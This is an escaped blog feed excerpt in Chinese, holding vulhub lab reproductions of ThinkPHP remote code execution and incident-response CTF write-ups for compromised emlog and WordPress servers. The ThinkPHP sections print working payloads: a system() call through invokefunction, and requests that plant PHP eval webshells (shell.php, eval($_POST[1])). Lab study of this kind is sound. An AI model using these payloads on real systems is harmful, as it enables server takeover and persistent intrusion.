&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250903125256.png" alt="image.png">&lt;br>
直接访问以下链接即可。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://192.168.197.140:8080/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250903125352.png" alt="image.png">&lt;/p>
&lt;h1 id="0x04-验证方式">0x04 验证方式&lt;/h1>
&lt;p>GET方式尝试命令执行，具体请求如下：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="mf">192.168&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">197.140&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">8080&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">think&lt;/span>\&lt;span class="n">app&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">invokefunction&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">function&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">call_user_func_array&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">vars&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">vars&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">][]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">whoami&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250903125633.png" alt="image.png">&lt;/p>
&lt;h1 id="0x05-利用方式">0x05 利用方式&lt;/h1>
&lt;h2 id="1url编码一句话木马内容">1、URL编码一句话木马内容：&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">echo%20%27%3C%3Fphp%20%40eval%28%24_POST%5B%22x%22%5D%29%3F%3E%27%20%3Eshell.php%20
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="2-直接访问连接">2. 直接访问连接：&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="mf">192.168&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">197.140&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">8080&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">/&lt;/span>\&lt;span class="n">think&lt;/span>\&lt;span class="n">app&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">invokefunction&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">function&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">call_user_func_array&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">vars&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">vars&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">][]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">echo&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">27&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="n">C&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="n">Fphp&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">40&lt;/span>&lt;span class="n">eval&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">28&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="n">_POST&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="n">B&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">22&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">22&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="n">D&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">29&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="n">F&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="n">E&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">27&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="n">Eshell&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">20&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250903125935.png" alt="image.png">&lt;/p>
&lt;h2 id="3-上传一句话木马">3. 上传一句话木马:&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">webshell地址：http://192.168.197.140:8080/shell.php
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">password：x
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="4-连接成功">4. 连接成功！！！&lt;/h2>
&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250903130030.png" alt="image.png">&lt;/p></description></item><item><title>【Thinkphp漏洞复现】ThinkPHP 2.x-任意代码执行</title><link>http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0thinkphp-2.x-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</link><pubDate>Tue, 02 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0thinkphp-2.x-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</guid><description>&lt;img src="http://localhost:1313/images/29.webp" alt="Featured image of post 【Thinkphp漏洞复现】ThinkPHP 2.x-任意代码执行" />&lt;h1 id="0x00-实验环境">0x00 实验环境&lt;/h1>
&lt;p>攻击机：Win 11&lt;br>
靶机也可作为攻击机：Ubuntu20 （docker搭建的vulhub靶场）&lt;br>
vulhub靶场下载地址：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://vulhub.org/zh#/environments/thinkphp/2-rce/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>部署：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cd vulhub-master/thinkphp/2-rce
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">docker-compose up -d
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">docker ps
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902134038.png" alt="image.png">&lt;/p>
&lt;h1 id="0x01-影响版本">0x01 影响版本&lt;/h1>
&lt;p>&lt;strong>标志&lt;/strong>：/index.php&lt;br>
&lt;strong>版本&lt;/strong>：thinkphp2.x&lt;br>
&lt;strong>简介&lt;/strong>：在ThinkPHP 2.x版本中，使用preg_replace的&lt;code>/e&lt;/code>模式匹配路由：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="o">$&lt;/span>&lt;span class="n">res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">preg_replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;@(\w+)&amp;#39;&lt;/span>&lt;span class="o">.$&lt;/span>&lt;span class="n">depr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="s1">&amp;#39;([^&amp;#39;&lt;/span>&lt;span class="o">.$&lt;/span>&lt;span class="n">depr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="s1">&amp;#39;\/]+)@e&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;$var[&lt;/span>&lt;span class="se">\&amp;#39;\\&lt;/span>&lt;span class="s1">1&lt;/span>&lt;span class="se">\&amp;#39;&lt;/span>&lt;span class="s1">]=&amp;#34;&lt;/span>&lt;span class="se">\\&lt;/span>&lt;span class="s1">2&amp;#34;;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">implode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">$&lt;/span>&lt;span class="n">depr&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">$&lt;/span>&lt;span class="n">paths&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞&lt;br>
大体说的还是因为php版本在&lt;strong>5.6.29&lt;/strong>以下时都是支持该函数执行中间的命令的，可到了&lt;strong>7.x&lt;/strong>就不支持了。简单来讲就是&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">preg_replace(&amp;#39;正则规则&amp;#39;,&amp;#39;替换字符&amp;#39;,&amp;#39;目标字符&amp;#39;)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>e&lt;/strong> 配合函数&lt;strong>preg_replace()使用&lt;/strong>, 可以把匹配来的字符串当作正则表达式执行;&lt;br>
&lt;strong>/e&lt;/strong> 可执行模式，此为PHP专有参数，例如preg_replace函数。&lt;br>
例如：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">&amp;lt;?php
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">@preg_replace(&amp;#39;/test/e&amp;#39;,&amp;#39;print_r(&amp;#34;AAA&amp;#34;);&amp;#39;,&amp;#39;just test&amp;#39;);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>只要在“just test”中匹配到了“test”字符，就执行中间的print_r这条函数的命令。&lt;/p>
&lt;h1 id="0x02-漏洞复现">0x02 漏洞复现&lt;/h1>
&lt;p>注：复现是比较简单的，原理需要自己去深入剖析&lt;br>
（1）访问页面&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902134411.png" alt="image.png">&lt;br>
（2）使用报错爆出thinkphp的版本2.1：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://192.168.197.140:8080/index.php/111
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902134632.png" alt="image.png">&lt;br>
 （3）抓包或者使用插件查看一下有没有php的版本号，上面有介绍过，那个命令执行的触发条件&amp;lt;=php5.6.29，下面这个版本是满足条件的：&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902134623.png" alt="image.png">&lt;br>
（4）漏洞利用：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://192.168.197.140:8080/index.php?s=/index/index/xxx/${@phpinfo()}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902134735.png" alt="image.png">&lt;br>
（5）传马，使用以下语句（类似于在该页面写入了一句话木马）：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://192.168.197.140:8080/index.php?s=/Index/index/xxx/${@print(eval($_POST[1]))}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>菜刀与蚁剑均能连接：&lt;br>
蚁剑连接：&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902135056.png" alt="image.png">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250902135103.png" alt="image.png">&lt;/p>
&lt;h1 id="0x02-漏洞修复">0x02 漏洞修复&lt;/h1>
&lt;p>&lt;strong>升级框架版本&lt;/strong>&lt;br>
ThinkPHP 2.x 已停止维护，漏洞无法通过零散修复彻底解决。&lt;strong>最彻底的方式是升级到官方支持的最新版本&lt;/strong>（如 ThinkPHP 5.1 或 6.x），这些版本对输入过滤、路由解析等机制进行了全面重构，安全性大幅提升。&lt;/p></description></item><item><title>【玄机靶场】第四章 windows 实战-emlog</title><link>http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows-%E5%AE%9E%E6%88%98-emlog/</link><pubDate>Mon, 01 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows-%E5%AE%9E%E6%88%98-emlog/</guid><description>&lt;img src="http://localhost:1313/images/25.webp" alt="Featured image of post 【玄机靶场】第四章 windows 实战-emlog" />&lt;h1 id="简介">简介&lt;/h1>
&lt;p>服务器场景操作系统 Windows&lt;br>
服务器账号密码 administrator xj@123456&lt;br>
题目来源公众号 知攻善防实验室&lt;br>
&lt;a href="https://mp.weixin.qq.com/s/89IS3jPePjBHFKPXnGmKfA">https://mp.weixin.qq.com/s/89IS3jPePjBHFKPXnGmKfA&lt;/a>&lt;br>
任务环境说明&lt;br>
注：样本请勿在本地运行！！！样本请勿在本地运行！！！样本请勿在本地运行！！！&lt;br>
应急响应工程师小王某人收到安全设备告警服务器被植入恶意文件，请上机排查&lt;br>
开放题目&lt;br>
漏洞修复&lt;br>
参考&lt;br>
&lt;a href="https://mp.weixin.qq.com/s/1gebC1OkDgtz4k4YtN10dg">https://mp.weixin.qq.com/s/1gebC1OkDgtz4k4YtN10dg&lt;/a>&lt;/p>
&lt;h1 id="靶机启动">靶机启动&lt;/h1>
&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250320132002.png" alt="Pasted image 20250320132002">&lt;/p>
&lt;h1 id="过程">过程&lt;/h1>
&lt;h2 id="flag1">flag1&lt;/h2>
&lt;p>&lt;strong>通过本地 PC RDP到服务器并且找到黑客植入 shell,将黑客植入 shell 的密码 作为 FLAG 提交;&lt;/strong>&lt;br>
上传D盾,直接扫就行.&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250320132223.png" alt="Pasted image 20250320132223">&lt;br>
打开文件,发现默认密码&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250320132347.png" alt="Pasted image 20250320132347">&lt;br>
flag&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{rebeyond}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="flag2">flag2&lt;/h2>
&lt;p>&lt;strong>通过本地 PC RDP到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;&lt;/strong>&lt;br>
查看apache.log文件,发现写入了webshell.php文件.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">log日志地址:C:\phpstudy_pro\Extensions\Apache2.4.39\logs
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250320133630.png" alt="Pasted image 20250320133630">&lt;br>
flag:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{192.168.126.1}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="flag3">flag3&lt;/h2>
&lt;p>&lt;strong>通过本地 PC RDP到服务器并且分析黑客的隐藏账户名称,将黑客隐藏账户名称作为 FLAG 提交;&lt;/strong>&lt;br>
直接使用工具,即可&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250320134054.png" alt="Pasted image 20250320134054">&lt;br>
flag:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{hacker138}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="flag4">flag4&lt;/h2>
&lt;p>&lt;strong>通过本地 PC RDP到服务器并且分析黑客的挖矿程序的矿池域名,将黑客挖矿程序的矿池域名称作为(仅域名)FLAG 提交;&lt;/strong>&lt;br>
找到hacker128用户的桌面,发现一个恶意的挖矿程序,然后进行反编译一下,得到flag&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250320134714.png" alt="Pasted image 20250320134714">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250320134701.png" alt="Pasted image 20250320134701">&lt;/p>
&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250320134701.png" alt="Pasted image 20250320134701">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250320134647.png" alt="Pasted image 20250320134647">&lt;br>
flag&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{wakuang.zhigongshanfang.top}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【玄机靶场】第四章 windows 实战-wordpress</title><link>http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows-%E5%AE%9E%E6%88%98-wordpress/</link><pubDate>Mon, 01 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows-%E5%AE%9E%E6%88%98-wordpress/</guid><description>&lt;img src="http://localhost:1313/images/26.webp" alt="Featured image of post 【玄机靶场】第四章 windows 实战-wordpress" />&lt;h1 id="简介">简介&lt;/h1>
&lt;p>第四章 windows实战-wordpress&lt;br>
rdp 端口 3389&lt;br>
账号：administrator&lt;br>
密码：xj@123456&lt;/p>
&lt;h1 id="flag1">flag1&lt;/h1>
&lt;p>&lt;strong>请提交攻击者攻击成功的第一时间，格式：flag{YY:MM:DD hh:mm:ss}&lt;/strong>&lt;br>
登录后台，获取后台地址：http://localhost:8080/manage/login.php&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325154712.png" alt="Pasted image 20250325154712">&lt;br>
在日志里筛选一下：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">grep  &amp;#34;manage/login.php&amp;#34; access.log
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>可以看到302成功跳转：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">192.168.141.55 - - [29/Apr/2023:22:45:23 +0800] &amp;#34;POST /index.php/action/login?_=139102b0477b064f9cf570483837d74c HTTP/1.1&amp;#34; 302 5 &amp;#34;http://
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">192.168.141.188/manage/login.php?referer=http%3A%2F%2F192.168.141.188%2Fmanage%2F&amp;#34; &amp;#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) G
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ecko/20100101 Firefox/110.0&amp;#34;                                                                                                             
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">192.168.141.55 - - [29/Apr/2023:22:45:23 +0800] &amp;#34;GET /manage/ HTTP/1.1&amp;#34; 302 5 &amp;#34;http://192.168.141.188/manage/login.php?referer=http%3A%2F
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">%2F192.168.141.188%2Fmanage%2F&amp;#34; &amp;#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0&amp;#34;                       
